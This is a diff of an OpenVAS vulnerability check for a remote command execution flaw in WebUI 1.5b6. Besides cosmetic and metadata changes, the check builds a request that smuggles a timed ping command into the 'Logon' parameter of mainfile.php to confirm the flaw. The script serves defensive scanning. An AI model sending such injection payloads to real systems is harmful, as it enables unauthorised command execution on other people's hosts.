@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_webui_rce_vuln.nasl 5789 2017-03-30 11:42:46Z cfi $
+# $Id: gb_webui_rce_vuln.nasl 11218 2018-09-04 11:43:35Z mmartin $
 #
 # WebUI Remote Command Execution Vulnerability
 #
@@ -27,40 +27,38 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805175");
-  script_version("$Revision: 5789 $");
+  script_version("$Revision: 11218 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-30 13:42:46 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 13:43:35 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-04-27 17:26:29 +0530 (Mon, 27 Apr 2015)");
   script_tag(name:"qod_type", value:"remote_analysis");
   script_name("WebUI Remote Command Execution Vulnerability");
 
-  script_tag(name: "summary" , value:"The host is installed with WebUI
+  script_tag(name:"summary", value:"The host is installed with WebUI
   and is prone to remote command execution.");
 
   script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
   and check whether it is able execute system command or not.");
 
-  script_tag(name: "insight" , value:"Flaw exists because the 'Logon' parameter
+  script_tag(name:"insight", value:"Flaw exists because the 'Logon' parameter
   is not properly sanitized upon submission to the mainfile.php script.");
 
-  script_tag(name: "impact" , value:"Successful exploitation will allow remote
+  script_tag(name:"impact", value:"Successful exploitation will allow remote
   attacker to execute arbitrary command on the affected system.
 
   Impact Level: System/Application");
 
-  script_tag(name: "affected" , value:"WebUI version 1.5b6, Prior versions may
+  script_tag(name:"affected", value:"WebUI version 1.5b6, Prior versions may
   also be affected.");
 
-  script_tag(name:"solution", value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/36821");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36821");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -76,22 +74,12 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
-time_taken = 0;
-wait_extra_sec = 5;
-
-## Get HTTP Port
 http_port = get_http_port(default:80);
 
-## Check Host Supports PHP
 if(!can_host_php(port:http_port)){
   exit(0);
 }
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/webui", cgi_dirs(port:http_port)))
 {
 
@@ -99,7 +87,6 @@ foreach dir (make_list_unique("/", "/webui", cgi_dirs(port:http_port)))
 
   rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);
 
-  ## confirm the Application
   if(">WebUI" >< rcvRes)
   {
     if(host_runs("Windows") == "yes"){
@@ -116,7 +103,6 @@ foreach dir (make_list_unique("/", "/webui", cgi_dirs(port:http_port)))
     ## Use sleep time to check we are able to execute command
     foreach sec (sleep)
     {
-      ## Construct attack request
       url = dir + "/mainfile.php?username=RCE&password=RCE&_login=1"
                 + "&Logon=';echo%20system('" + ping + sec + "%20127.0.0.1');'";
 
